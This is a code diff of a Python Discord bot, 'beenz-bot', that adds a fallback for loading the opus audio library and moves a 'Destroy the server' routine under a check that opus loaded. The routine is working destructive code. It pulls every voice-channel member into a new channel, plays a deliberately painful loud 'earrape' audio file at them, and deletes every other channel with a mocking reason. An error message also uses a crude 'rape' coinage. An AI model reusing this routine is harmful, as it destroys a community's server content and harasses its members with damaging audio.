@@ -1,4 +1,4 @@
-#                     ===beenz-bot v2.4===
+#                     ===beenz-bot v2.4.2b===
 #                       ===beenz.py===
 #  ======Copyright 2020 Pr0x1mas, TheProgramableTurtle======
 
@@ -14,10 +14,20 @@ import time
 import inspect
 import youtube_dl
 import asyncio
+import pathlib
 
+progDir = pathlib.Path(__file__).parent.absolute()
 # --Setup to play audio--
 if not discord.opus.is_loaded(): # opus library for playing audio or something
-    discord.opus.load_opus('libopus-0.dll')
+    try:
+        discord.opus.load_opus("./lib/discord/bin/libopus-0.x86.dll")
+    except:
+        print("Could not find opus dll in ./lib/discord/bin directory. Consider running metalgearrape from the program folder.")
+        try:
+            discord.opus.load_opus(f"{progDir}/../discord/bin/libopus-0.x86.dll")
+            print(f"Found opus dll in {progDir}/../discord/bin/libopus-0.x86.dll")
+        except:
+            print("Could not find opus dll in working directory. Audio functionality will be disabled.")
 
 ytdl_format_options = { # configuration for downloading youtube audio and playing it
     'format': 'bestaudio/best',
@@ -270,31 +280,31 @@ class Bot(cmd.Bot):
 
         # --Destroy the server--
         
-        # -move users to new vc-
-        voicechannels = []
-        for channel in ctx.guild.voice_channels:  # get all voice channels
-            voicechannels.append(channel)
+        # -move users to new vc if opus dll is loaded-
+        if discord.opus.is_loaded():
+            voicechannels = []
+            for channel in ctx.guild.voice_channels:  # get all voice channels
+                voicechannels.append(channel)
 
-        earrape = await ctx.guild.create_voice_channel('ur nan')
+            earrape = await ctx.guild.create_voice_channel('ur nan')
 
-        for channel in voicechannels:
-            for user in channel.members:
-                await user.move_to(earrape)
+            for channel in voicechannels:
+                for user in channel.members:
+                    await user.move_to(earrape)
 
-       # -play earrape in vc- 
-        vc = await earrape.connect()
-        voice_client: discord.VoiceClient = discord.utils.get(bot.voice_clients, guild=ctx.guild)
-        #audio_source = await YTDLSource.from_url("https://www.youtube.com/watch?v=QVYSsn_HL1w")
-        audio_source = discord.FFmpegPCMAudio('assets/earrape.webm')
-        voice_client.play(audio_source, after=None)
+           # -play earrape in vc-
+            vc = await earrape.connect()
+            voice_client: discord.VoiceClient = discord.utils.get(bot.voice_clients, guild=ctx.guild)
+            #audio_source = await YTDLSource.from_url("https://www.youtube.com/watch?v=QVYSsn_HL1w")
+            audio_source = discord.FFmpegPCMAudio('assets/earrape.webm')
+            voice_client.play(audio_source, after=None)
 
-        # -delete all channels-
-        channels = []
-        for channel in ctx.guild.channels:  # get all channels
-            if channel != earrape:
-                await channel.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+            # -delete all channels-
+            channels = []
+            for channel in ctx.guild.channels:  # get all channels
+                if channel != earrape:
+                    await channel.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
      
-        
 
         # -make new channel-
         heinz = await ctx.guild.create_text_channel('HEINZ')
